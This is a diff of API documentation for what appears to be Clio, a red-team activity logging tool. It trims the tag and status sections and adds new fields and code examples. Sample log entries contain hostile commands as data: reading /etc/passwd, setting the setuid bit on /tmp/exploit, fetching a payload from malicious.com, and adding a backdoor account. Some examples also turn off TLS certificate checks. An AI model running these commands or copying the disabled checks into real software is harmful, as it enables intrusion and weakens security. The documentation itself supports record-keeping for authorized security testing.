@@ -88,8 +88,7 @@ POST /api/ingest/logs
   "command": "cat /etc/passwd",
   "notes": "Privilege escalation attempt",
   "filename": "passwd",
-  "status": "ON_DISK",
-  "tags": ["reconnaissance", "linux", "sensitive"]
+  "status": "ON_DISK"
 }
 ```
 
@@ -99,15 +98,13 @@ POST /api/ingest/logs
   {
     "internal_ip": "192.168.1.100",
     "hostname": "host-1",
-    "command": "chmod +s /tmp/exploit",
-    "tags": ["privilege-escalation", "persistence"]
+    "command": "chmod +s /tmp/exploit"
   },
   {
     "external_ip": "198.51.100.1",
     "hostname": "host-2",
     "domain": "example.org",
-    "command": "wget http://malicious.com/payload",
-    "tags": ["execution", "cobalt-strike"]
+    "command": "wget http://malicious.com/payload"
   }
 ]
 ```
@@ -119,22 +116,15 @@ POST /api/ingest/logs
   "results": [
     {
       "id": 1234,
-      "success": true,
-      "tags": ["privilege-escalation", "persistence", "OP:RedTeam2025"]
+      "success": true
     },
     {
       "id": 1235,
-      "success": true,
-      "tags": ["execution", "cobalt-strike", "OP:RedTeam2025"]
+      "success": true
     }
   ]
 }
 ```
-
-**Note on Tags:**
-- Tags can be included as an array of tag names in the log submission
-- The system will automatically add the operation tag if the API key is associated with a user who has an active operation
-- If a tag doesn't exist, it will be created automatically (for non-admin API keys, only certain tag categories may be created)
 
 ## Field Descriptions
 
@@ -148,189 +138,115 @@ POST /api/ingest/logs
 | command | Command executed on the system | 150 | No |
 | notes | Additional context or observations | 254 | No |
 | filename | Name of relevant files | 100 | No |
-| status | File status (ON_DISK, IN_MEMORY, etc.) | 20 | No |
-| tags | Array of tag names to apply to the log | - | No |
-
-## Valid Status Values
-
-- `ON_DISK` - File is present on the target system
-- `IN_MEMORY` - File exists only in memory
-- `ENCRYPTED` - File is encrypted on disk
-- `REMOVED` - File has been deleted
-- `CLEANED` - File and traces have been removed
-- `DORMANT` - File is inactive but present
-- `DETECTED` - File has been detected by security tools
-- `UNKNOWN` - Status is unknown or unverified
-
-## Available Tags
-
-The system includes pre-defined tags in several categories:
-
-### MITRE ATT&CK Technique Tags
-- `reconnaissance`, `initial-access`, `execution`, `persistence`
-- `privilege-escalation`, `defense-evasion`, `credential-access`
-- `discovery`, `lateral-movement`, `collection`
-- `command-control`, `exfiltration`, `impact`
-
-### Tool Tags
-- `mimikatz`, `cobalt-strike`, `metasploit`, `empire`
-- `bloodhound`, `rubeus`, `sharphound`, `powerview`
-- `nmap`, `burpsuite`, `sqlmap`
-
-### Workflow Tags
-- `in-progress`, `needs-review`, `completed`
-- `verified`, `documented`, `reported`
-
-### Evidence Tags
-- `screenshot`, `packet-capture`, `memory-dump`, `log-file`
-
-### Security Classification Tags
-- `sensitive`, `pii`, `classified`
-
-### Operation Tags
-- Automatically created with prefix `OP:` when operations are created
-- Example: `OP:RedTeam2025`, `OP:PenTest-ClientName`
-
-## Example: Python Script
-
-```python
-import requests
-import json
-
-# Configuration
-API_KEY = "rtl_yourkey_abc123"
-CLIO_URL = "https://your-clio-server"
-
-# Headers
-headers = {
-    "X-API-Key": API_KEY,
-    "Content-Type": "application/json"
-}
-
-# Submit a single log with tags
-log_data = {
-    "internal_ip": "192.168.1.100",
-    "hostname": "dc01",
-    "domain": "corp.example.com",
-    "username": "administrator",
-    "command": "net user backdoor P@ssw0rd123 /add",
-    "notes": "Created backdoor account",
-    "status": "ON_DISK",
-    "tags": ["persistence", "credential-access", "verified"]
-}
-
-response = requests.post(
-    f"{CLIO_URL}/api/ingest/logs",
-    headers=headers,
-    json=log_data
-)
-
-if response.status_code == 200:
-    print("Log submitted successfully")
-    print(json.dumps(response.json(), indent=2))
-else:
-    print(f"Error: {response.status_code}")
-    print(response.text)
-```
-
-## Example: Bash/cURL
-
-```bash
-#!/bin/bash
-
-API_KEY="rtl_yourkey_abc123"
-CLIO_URL="https://your-clio-server"
-
-# Submit a log with tags
-curl -X POST "${CLIO_URL}/api/ingest/logs" \
-  -H "X-API-Key: ${API_KEY}" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "internal_ip": "10.10.10.5",
-    "hostname": "web-server",
-    "command": "whoami",
-    "notes": "Initial access achieved",
-    "status": "IN_MEMORY",
-    "tags": ["initial-access", "web-exploit"]
-  }'
-```
-
-## Example: PowerShell
-
-```powershell
-$apiKey = "rtl_yourkey_abc123"
-$clioUrl = "https://your-clio-server"
-
-$headers = @{
-    "X-API-Key" = $apiKey
-    "Content-Type" = "application/json"
-}
-
-$logData = @{
-    internal_ip = "172.16.0.10"
-    hostname = "file-server"
-    command = "Get-LocalUser"
-    notes = "Enumeration phase"
-    status = "IN_MEMORY"
-    tags = @("discovery", "powershell")
-} | ConvertTo-Json
-
-$response = Invoke-RestMethod `
-    -Uri "$clioUrl/api/ingest/logs" `
-    -Method Post `
-    -Headers $headers `
-    -Body $logData
-
-Write-Host "Log submitted successfully:"
-$response | ConvertTo-Json
-```
-
-## Rate Limiting
-
-API endpoints are rate-limited to prevent abuse:
-- **Per API Key**: 1000 requests per minute
-- **Per IP**: 100 requests per minute for unauthenticated endpoints
-
-If you exceed these limits, you'll receive a `429 Too Many Requests` response.
+| status | File status (ON_DISK, IN_MEMORY, etc.) | 75 | No |
+| hash_algorithm | Hash algorithm used (MD5, SHA1, etc.) | 20 | No |
+| hash_value | File hash value | 128 | No |
+| secrets | Credentials or tokens (automatically masked) | 150 | No |
 
 ## Error Responses
 
-Common error responses and their meanings:
+| Status Code | Description | Example |
+|-------------|-------------|---------|
+| 400 | Bad Request (invalid data) | `{"error": "Invalid log data"}` |
+| 401 | Unauthorized (invalid API key) | `{"error": "Invalid API key"}` |
+| 403 | Forbidden (insufficient permissions) | `{"error": "Insufficient permissions", "detail": "This API key does not have the required permission: logs:write"}` |
+| 429 | Too Many Requests (rate limit exceeded) | `{"error": "Too many requests", "detail": "Rate limit exceeded. Try again later."}` |
+| 500 | Server Error | `{"error": "Internal server error"}` |
 
-| Status Code | Meaning | Action |
-|-------------|---------|--------|
-| 400 | Bad Request | Check your request format and required fields |
-| 401 | Unauthorized | Verify your API key is correct and active |
-| 403 | Forbidden | API key lacks required permissions |
-| 404 | Not Found | Check the endpoint URL |
-| 429 | Too Many Requests | You've hit rate limits, wait before retrying |
-| 500 | Internal Server Error | Server issue, contact administrator if persists |
+## Rate Limits
+
+To ensure system stability, API requests are rate-limited:
+
+- **Log Submission**: 60 requests per minute (1 per second)
+- **Maximum batch size**: 50 logs per request
+- **Maximum request size**: 10MB
+
+## Code Examples
+
+### cURL Example
+
+```bash
+curl -k -X POST https://your-IP-or-Host/ingest/logs \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: rtl_yourkey_abc123" \
+  -d '{
+    "internal_ip": "192.168.1.100",
+    "external_ip": "203.0.113.1",
+    "hostname": "victim-host",
+    "domain": "example.org",
+    "username": "jsmith",
+    "command": "cat /etc/passwd",
+    "notes": "Privilege escalation attempt",
+    "filename": "passwd",
+    "status": "ON_DISK"
+  }'
+```
+
+### Python Example
+
+```python
+import requests
+import urllib3
+
+# Disable SSL warnings for self-signed certificates
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def send_log(api_key, log_data):
+    url = "https://your-IP-or-Host/ingest/logs"
+    headers = {
+        "Content-Type": "application/json",
+        "X-API-Key": api_key
+    }
+    
+    response = requests.post(url, headers=headers, json=log_data, verify=False)
+    response.raise_for_status()
+    return response.json()
+
+# Example usage
+api_key = "rtl_yourkey_abc123"
+log_data = {
+    "internal_ip": "192.168.1.100",
+    "hostname": "victim-host",
+    "command": "cat /etc/passwd",
+    "status": "ON_DISK"
+}
+
+result = send_log(api_key, log_data)
+print(result)
+```
+
+### PowerShell Example
+
+```powershell
+# Disable SSL certificate validation for self-signed certs
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+$url = "https://your-IP-or-Host/ingest/logs"
+$headers = @{
+    "Content-Type" = "application/json"
+    "X-API-Key" = "rtl_yourkey_abc123"
+}
+$payload = @{
+    internal_ip = "192.168.1.100"
+    external_ip = "203.0.113.1"
+    hostname = "victim-host"
+    domain = "example.org"
+    username = "jsmith"
+    command = "cat /etc/passwd"
+    notes = "Privilege escalation attempt"
+    filename = "passwd"
+    status = "ON_DISK"
+} | ConvertTo-Json
+
+$response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $payload -ContentType "application/json"
+$response | ConvertTo-Json
+```
 
 ## Best Practices
 
-1. **Batch Submissions**: Send multiple logs in a single request when possible
-2. **Error Handling**: Implement retry logic with exponential backoff
-3. **Tag Consistently**: Use standardized tags across your tools for better analysis
-4. **Include Context**: Add meaningful notes to help with later analysis
-5. **Validate Data**: Ensure IP addresses and other fields are properly formatted
-6. **Use HTTPS**: Always use HTTPS in production environments
-7. **Secure Storage**: Never commit API keys to version control
-8. **Monitor Usage**: Track your API usage to avoid rate limits
-9. **Operation Tags**: Coordinate with your team on operation naming conventions
-
-## Integration with C2 Frameworks
-
-Clio includes log forwarders for popular C2 frameworks that automatically use the API:
-
-- **Cobalt Strike**: See [Cobalt Strike Integration](../log_exporter/docs/COBALT_STRIKE.md)
-- **Sliver**: See [Sliver Integration](../log_exporter/docs/SLIVER.md)
-
-These forwarders handle authentication, batching, and error recovery automatically.
-
-## Support
-
-For API-related issues:
-1. Check API key permissions and expiration
-2. Verify request format matches documentation
-3. Review server logs for detailed error messages
-4. Contact your system administrator for assistance
+1. **Secure your API keys** - Treat API keys like passwords. Don't hardcode them in scripts.
+2. **Set expiration dates** - Periodically rotate API keys for better security.
+3. **Use minimal permissions** - Give each key only the permissions it needs.
+4. **Include relevant context** - Provide detailed information in log entries.
+5. **Implement error handling** - Handle API errors gracefully in your code.
+6. **Monitor usage** - Regularly check API key usage in the admin panel.
